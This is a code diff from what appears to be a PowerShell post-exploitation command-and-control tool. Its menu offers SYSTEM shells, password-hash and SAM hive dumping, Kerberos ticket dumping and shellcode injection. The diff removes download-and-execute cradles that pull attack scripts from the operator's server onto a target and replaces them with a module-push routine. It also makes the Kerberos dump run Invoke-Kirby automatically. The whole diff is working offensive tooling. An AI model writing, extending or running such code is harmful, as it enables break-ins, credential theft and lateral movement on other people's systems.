@@ -2048,7 +2048,7 @@ function Start-LocalShell {
             Write-Output "   GetSystem          Get a SYSTEM shell [remote session only]"
             Write-Output "   HashGrab           Attempt to retrieve the hash of the current user"
             Write-Output "   Hive               HiveDump - SAM / SYSTEM / SECURITY"
-            Write-Output "   Kerb               Dump Kerberos TGTs - use: Invoke-Kirby"
+            Write-Output "   Kerb               Dump Kerberos TGTs (auto-runs Invoke-Kirby)"
             Write-Output "   Migrate ps <pid>   Inject into PID via AmnesiacLoader IndirectSyscall (no PInject needed)"
             Write-Output "   Migrate <pid>      Inject shellcode into PID [requires PInject loaded first]"
             Write-Output "   Monitor            Monitor cache for TGTs - use: TGT_Monitor"
@@ -4092,14 +4092,28 @@ function InteractWithPipeSession{
 		
 		elseif ($command -eq "LocalAdminAccess") {
 			PrintHelpLocalAdminAccess
-			$sw.WriteLine("iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Find-LocalAdminAccess.ps1')")
-			$sw.Flush()
+			Write-Output ""
+			Write-Output " [+] Sending Find-LocalAdminAccess to target..."
+			if (Send-Module -ToolName 'Find-LocalAdminAccess' -Writer $sw -Reader $sr) {
+				Write-Output " [+] Find-LocalAdminAccess loaded"
+				Write-Output ""
+			} else {
+				Write-Output " [-] Find-LocalAdminAccess not in cache."
+			}
+			continue
 		}
-		
+
 		elseif ($command -eq "SessionHunter") {
 			PrintHelpSessionHunter
-			$sw.WriteLine("iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Invoke-SessionHunter.ps1')")
-			$sw.Flush()
+			Write-Output ""
+			Write-Output " [+] Sending Invoke-SessionHunter to target..."
+			if (Send-Module -ToolName 'Invoke-SessionHunter' -Writer $sw -Reader $sr) {
+				Write-Output " [+] Invoke-SessionHunter loaded"
+				Write-Output ""
+			} else {
+				Write-Output " [-] Invoke-SessionHunter not in cache."
+			}
+			continue
 		}
 
 		elseif ($command -eq 'PowerUp') {
@@ -4164,12 +4178,14 @@ function InteractWithPipeSession{
 			Write-Output ""
 			Write-Output " [+] Sending Kerb to target..."
 			if (Send-Module -ToolName 'dumper' -Writer $sw -Reader $sr) {
-				Write-Output " [+] Kerb loaded -- run: Invoke-Kirby"
+				Write-Output " [+] Kerb loaded -- running Invoke-Kirby"
 				Write-Output ""
+				$sw.WriteLine('Invoke-Kirby')
+				$sw.Flush()
 			} else {
 				Write-Output " [-] Kerb not in cache. Add dumper.ps1 to Tools\ and run: modules reload"
+				continue
 			}
-			continue
 		}
 
 		elseif ($command -eq 'Patch') {
